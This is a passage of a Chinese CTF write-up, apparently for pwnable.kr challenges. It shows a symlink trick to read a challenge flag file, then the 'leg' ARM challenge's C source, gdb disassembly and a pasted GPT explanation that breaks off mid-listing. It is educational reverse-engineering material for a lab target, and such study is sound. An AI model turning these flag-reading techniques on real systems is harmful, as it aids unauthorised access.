<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /home/input2/flag flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>最后得到flag!</p>
<p><img src="https://s2.loli.net/2024/08/19/Gkw5XDjcYhvAxFe.png" alt="c81b16adb98b41f1adaa1811b8c09d2e.png"></p>
<h5 id="第八题-leg"><a href="#第八题-leg" class="headerlink" title="第八题-leg"></a>第八题-leg</h5><p>这题是个异架构汇编题，但考的很简单</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;fcntl.h></span>
<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, pc\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">asm</span><span class="token punctuation">(</span>
  <span class="token string">"push	&#123;r6&#125;\n"</span>
  <span class="token string">"add	r6, pc, $1\n"</span>
  <span class="token string">"bx	r6\n"</span>
  <span class="token string">".code   16\n"</span>
  <span class="token string">"mov	r3, pc\n"</span>
  <span class="token string">"add	r3, $0x4\n"</span>
  <span class="token string">"push	&#123;r3&#125;\n"</span>
  <span class="token string">"pop	&#123;pc&#125;\n"</span>
  <span class="token string">".code	32\n"</span>
  <span class="token string">"pop	&#123;r6&#125;\n"</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, lr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token class-name"><span class="token keyword">int</span></span> key<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Daddy has very strong arm! : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratz!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token keyword">int</span></span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name"><span class="token keyword">int</span></span> r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I have strong leg :P\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>从源码中可以看出来就是算出来那三个key就完事了。</p>
<p>有一个leg.asm文件，这里直接放到文本编辑器打开就可以了。寄存器都是r开头多，就是arm架构下的</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disass main
Dump of assembler code <span class="token keyword">for</span> <span class="token class-name">function</span> main<span class="token punctuation">:</span>
   <span class="token number">0x00008d3c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span><span class="token punctuation">:</span>	push	<span class="token punctuation">&#123;</span>r4<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> lr<span class="token punctuation">&#125;</span>
   <span class="token number">0x00008d40</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r11<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> #<span class="token number">8</span>
   <span class="token number">0x00008d44</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">sub</span>	sp<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> #<span class="token number">12</span>
   <span class="token number">0x00008d48</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008d4c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">str</span>	r3<span class="token punctuation">,</span> <span class="token punctuation">[</span>r11<span class="token punctuation">,</span> #<span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">]</span>
   <span class="token number">0x00008d50</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">ldr</span>	r0<span class="token punctuation">,</span> <span class="token punctuation">[</span>pc<span class="token punctuation">,</span> #<span class="token number">104</span><span class="token punctuation">]</span>	<span class="token punctuation">;</span> <span class="token number">0x8dc0</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">132</span><span class="token operator">></span>
   <span class="token number">0x00008d54</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">24</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0xfb6c</span> <span class="token operator">&lt;</span>printf<span class="token operator">></span>
   <span class="token number">0x00008d58</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">sub</span>	r3<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> #<span class="token number">16</span>
   <span class="token number">0x00008d5c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">ldr</span>	r0<span class="token punctuation">,</span> <span class="token punctuation">[</span>pc<span class="token punctuation">,</span> #<span class="token number">96</span><span class="token punctuation">]</span>	<span class="token punctuation">;</span> <span class="token number">0x8dc4</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">136</span><span class="token operator">></span>
   <span class="token number">0x00008d60</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">36</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r1<span class="token punctuation">,</span> r3
   <span class="token number">0x00008d64</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">40</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0xfbd8</span> <span class="token operator">&lt;</span>__isoc99_scanf<span class="token operator">></span>
   <span class="token number">0x00008d68</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">44</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0x8cd4</span> <span class="token operator">&lt;</span>key1<span class="token operator">></span>
   <span class="token number">0x00008d6c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r4<span class="token punctuation">,</span> r0
   <span class="token number">0x00008d70</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">52</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0x8cf0</span> <span class="token operator">&lt;</span>key2<span class="token operator">></span>
   <span class="token number">0x00008d74</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">56</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> r0
   <span class="token number">0x00008d78</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r4<span class="token punctuation">,</span> r4<span class="token punctuation">,</span> r3
   <span class="token number">0x00008d7c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0x8d20</span> <span class="token operator">&lt;</span>key3<span class="token operator">></span>
   <span class="token number">0x00008d80</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">68</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> r0
   <span class="token number">0x00008d84</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">72</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r2<span class="token punctuation">,</span> r4<span class="token punctuation">,</span> r3
   <span class="token number">0x00008d88</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">76</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">ldr</span>	r3<span class="token punctuation">,</span> <span class="token punctuation">[</span>r11<span class="token punctuation">,</span> #<span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">]</span>
   <span class="token number">0x00008d8c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">cmp</span>	r2<span class="token punctuation">,</span> r3
   <span class="token number">0x00008d90</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">84</span><span class="token operator">></span><span class="token punctuation">:</span>	bne	<span class="token number">0x8da8</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">108</span><span class="token operator">></span>
   <span class="token number">0x00008d94</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">88</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">ldr</span>	r0<span class="token punctuation">,</span> <span class="token punctuation">[</span>pc<span class="token punctuation">,</span> #<span class="token number">44</span><span class="token punctuation">]</span>	<span class="token punctuation">;</span> <span class="token number">0x8dc8</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">140</span><span class="token operator">></span>
   <span class="token number">0x00008d98</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">92</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0x1050c</span> <span class="token operator">&lt;</span>puts<span class="token operator">></span>
   <span class="token number">0x00008d9c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">ldr</span>	r0<span class="token punctuation">,</span> <span class="token punctuation">[</span>pc<span class="token punctuation">,</span> #<span class="token number">40</span><span class="token punctuation">]</span>	<span class="token punctuation">;</span> <span class="token number">0x8dcc</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">144</span><span class="token operator">></span>
   <span class="token number">0x00008da0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">100</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0xf89c</span> <span class="token operator">&lt;</span>system<span class="token operator">></span>
   <span class="token number">0x00008da4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">104</span><span class="token operator">></span><span class="token punctuation">:</span>	b	<span class="token number">0x8db0</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">116</span><span class="token operator">></span>
   <span class="token number">0x00008da8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">108</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">ldr</span>	r0<span class="token punctuation">,</span> <span class="token punctuation">[</span>pc<span class="token punctuation">,</span> #<span class="token number">32</span><span class="token punctuation">]</span>	<span class="token punctuation">;</span> <span class="token number">0x8dd0</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">148</span><span class="token operator">></span>
   <span class="token number">0x00008dac</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span><span class="token punctuation">:</span>	bl	<span class="token number">0x1050c</span> <span class="token operator">&lt;</span>puts<span class="token operator">></span>
   <span class="token number">0x00008db0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">116</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008db4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">120</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r0<span class="token punctuation">,</span> r3
   <span class="token number">0x00008db8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">124</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">sub</span>	sp<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> #<span class="token number">8</span>
   <span class="token number">0x00008dbc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">128</span><span class="token operator">></span><span class="token punctuation">:</span>	pop	<span class="token punctuation">&#123;</span>r4<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> pc<span class="token punctuation">&#125;</span>
   <span class="token number">0x00008dc0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">132</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">andeq</span>	r10<span class="token punctuation">,</span> r6<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> lsl #<span class="token number">9</span>
   <span class="token number">0x00008dc4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">136</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">andeq</span>	r10<span class="token punctuation">,</span> r6<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> lsr #<span class="token number">9</span>
   <span class="token number">0x00008dc8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">140</span><span class="token operator">></span><span class="token punctuation">:</span>			<span class="token punctuation">;</span> <span class="token operator">&lt;</span>UNDEFINED<span class="token operator">></span> instruction<span class="token punctuation">:</span> <span class="token number">0x0006a4b0</span>
   <span class="token number">0x00008dcc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">144</span><span class="token operator">></span><span class="token punctuation">:</span>			<span class="token punctuation">;</span> <span class="token operator">&lt;</span>UNDEFINED<span class="token operator">></span> instruction<span class="token punctuation">:</span> <span class="token number">0x0006a4bc</span>
   <span class="token number">0x00008dd0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">148</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">andeq</span>	r10<span class="token punctuation">,</span> r6<span class="token punctuation">,</span> r4<span class="token punctuation">,</span> asr #<span class="token number">9</span>
End of assembler dump<span class="token punctuation">.</span>
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disass key1
Dump of assembler code <span class="token keyword">for</span> <span class="token class-name">function</span> key1<span class="token punctuation">:</span>
   <span class="token number">0x00008cd4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span><span class="token punctuation">:</span>	push	<span class="token punctuation">&#123;</span>r11<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">str</span> r11<span class="token punctuation">,</span> <span class="token punctuation">[</span>sp<span class="token punctuation">,</span> #<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!</span><span class="token punctuation">)</span>
   <span class="token number">0x00008cd8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r11<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008cdc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> pc
   <span class="token number">0x00008ce0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r0<span class="token punctuation">,</span> r3
   <span class="token number">0x00008ce4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">sub</span>	sp<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008ce8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span><span class="token punctuation">:</span>	pop	<span class="token punctuation">&#123;</span>r11<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">ldr</span> r11<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">sp</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> #<span class="token number">4</span><span class="token punctuation">)</span>
   <span class="token number">0x00008cec</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">24</span><span class="token operator">></span><span class="token punctuation">:</span>	bx	lr
End of assembler dump<span class="token punctuation">.</span>
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disass key2
Dump of assembler code <span class="token keyword">for</span> <span class="token class-name">function</span> key2<span class="token punctuation">:</span>
   <span class="token number">0x00008cf0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span><span class="token punctuation">:</span>	push	<span class="token punctuation">&#123;</span>r11<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">str</span> r11<span class="token punctuation">,</span> <span class="token punctuation">[</span>sp<span class="token punctuation">,</span> #<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!</span><span class="token punctuation">)</span>
   <span class="token number">0x00008cf4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r11<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008cf8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token punctuation">:</span>	push	<span class="token punctuation">&#123;</span>r6<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">str</span> r6<span class="token punctuation">,</span> <span class="token punctuation">[</span>sp<span class="token punctuation">,</span> #<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!</span><span class="token punctuation">)</span>
   <span class="token number">0x00008cfc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r6<span class="token punctuation">,</span> pc<span class="token punctuation">,</span> #<span class="token number">1</span>
   <span class="token number">0x00008d00</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token punctuation">:</span>	bx	r6
   <span class="token number">0x00008d04</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> pc
   <span class="token number">0x00008d06</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">adds</span>	r3<span class="token punctuation">,</span> #<span class="token number">4</span>
   <span class="token number">0x00008d08</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">24</span><span class="token operator">></span><span class="token punctuation">:</span>	push	<span class="token punctuation">&#123;</span>r3<span class="token punctuation">&#125;</span>
   <span class="token number">0x00008d0a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">26</span><span class="token operator">></span><span class="token punctuation">:</span>	pop	<span class="token punctuation">&#123;</span>pc<span class="token punctuation">&#125;</span>
   <span class="token number">0x00008d0c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span><span class="token punctuation">:</span>	pop	<span class="token punctuation">&#123;</span>r6<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">ldr</span> r6<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">sp</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> #<span class="token number">4</span><span class="token punctuation">)</span>
   <span class="token number">0x00008d10</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r0<span class="token punctuation">,</span> r3
   <span class="token number">0x00008d14</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">36</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">sub</span>	sp<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008d18</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">40</span><span class="token operator">></span><span class="token punctuation">:</span>	pop	<span class="token punctuation">&#123;</span>r11<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">ldr</span> r11<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">sp</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> #<span class="token number">4</span><span class="token punctuation">)</span>
   <span class="token number">0x00008d1c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">44</span><span class="token operator">></span><span class="token punctuation">:</span>	bx	lr
End of assembler dump<span class="token punctuation">.</span>
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disass key3
Dump of assembler code <span class="token keyword">for</span> <span class="token class-name">function</span> key3<span class="token punctuation">:</span>
   <span class="token number">0x00008d20</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span><span class="token punctuation">:</span>	push	<span class="token punctuation">&#123;</span>r11<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">str</span> r11<span class="token punctuation">,</span> <span class="token punctuation">[</span>sp<span class="token punctuation">,</span> #<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!</span><span class="token punctuation">)</span>
   <span class="token number">0x00008d24</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token keyword">add</span>	r11<span class="token punctuation">,</span> sp<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008d28</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r3<span class="token punctuation">,</span> lr
   <span class="token number">0x00008d2c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">mov</span>	r0<span class="token punctuation">,</span> r3
   <span class="token number">0x00008d30</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token punctuation">:</span>	<span class="token class-name">sub</span>	sp<span class="token punctuation">,</span> r11<span class="token punctuation">,</span> #<span class="token number">0</span>
   <span class="token number">0x00008d34</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span><span class="token punctuation">:</span>	pop	<span class="token punctuation">&#123;</span>r11<span class="token punctuation">&#125;</span>		<span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token class-name">ldr</span> r11<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">sp</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> #<span class="token number">4</span><span class="token punctuation">)</span>
   <span class="token number">0x00008d38</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">24</span><span class="token operator">></span><span class="token punctuation">:</span>	bx	lr
End of assembler dump<span class="token punctuation">.</span>
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>对照哪个源码分析。</p>
<p>直接让gpt分析什么意思吧，本人是个菜鸡所以汇编不太熟</p>
<blockquote>
<p>当然，以下是对每个函数的详细分析，包括每一条汇编指令的作用。</p>
<p>### 函数 <code>main</code></p>
<p>`&#96;&#96;assembly<br> 0x00008d3c &lt;+0&gt;:   push   {r4, r11, lr}<br> 0x00008d40 &lt;+4&gt;:   add   r11, sp, #8<br> 0x00008d44 &lt;+8&gt;:   sub   sp, sp, #12<br> 0x00008d48 &lt;+12&gt;:   mov   r3, #0<br> 0x00008d4c &lt;+16&gt;:   str   r3, [r11, #-16]<br> 0x00008d50 &lt;+20&gt;:   ldr   r0, [pc, #104]   ; 0x8dc0 &lt;main+132&gt;<br> 0x00008d54 &lt;+24&gt;:   bl   0xfb6c <printf><br> 0x00008d58 &lt;+28&gt;:   sub   r3, r11, #16<br> 0x00008d5c &lt;+32&gt;:   ldr   r0, [pc, #96]   ; 0x8dc4 &lt;main+136&gt;<br> 0x00008d60 &lt;+36&gt;:   mov   r1, r3<br> 0x00008d64 &lt;+40&gt;:   bl   0xfbd8 &lt;__isoc99_scanf&gt;<br> 0x00008d68 &lt;+44&gt;:   bl   0x8cd4 <key1><br> 0x00008d6c &lt;+48&gt;:   mov   r4, r0<br> 0x00008d70 &lt;+52&gt;:   bl   0x8cf0 <key2><br> 0x00008d74 &lt;+56&gt;:   mov   r3, r0<br> 0x00008d78 &lt;+60&gt;:   add   r4, r4, r3<br> 0x00008d7c &lt;+64&gt;:   bl   0x8d20 <key3><br> 0x00008d80 &lt;+68&gt;:   mov   r3, r0<br> 0x00008d84 &lt;+72&gt;:   add   r2, r4, r3<br> 0x00008d88 &lt;+76&gt;:   ldr   r3, [r11, #-16]<br> 0x00008d8c &lt;+80&gt;:   cmp   r2, r3<br> 0x00008d90 &lt;+84&gt;:   bne   0x8da8 &lt;main+108&gt;<br> 0x00008d94 &lt;+88&gt;:   ldr   r0, [pc, #44]   ; 0x8dc8 &lt;main+140&gt;<br> 0x00008d98 &lt;+92&gt;:   bl   0x1050c <puts><br> 0x00008d9c &lt;+96&gt;:   ldr   r0, [pc, #40]   ; 0x8dcc &lt;main+144&gt;<br> 0x00008da0 &lt;+100&gt;:   bl   0xf89c <system><br> 0x00008da4 &lt;+104&gt;:   b   0x8db0 &lt;main+116&gt;<br> 0x00008da8 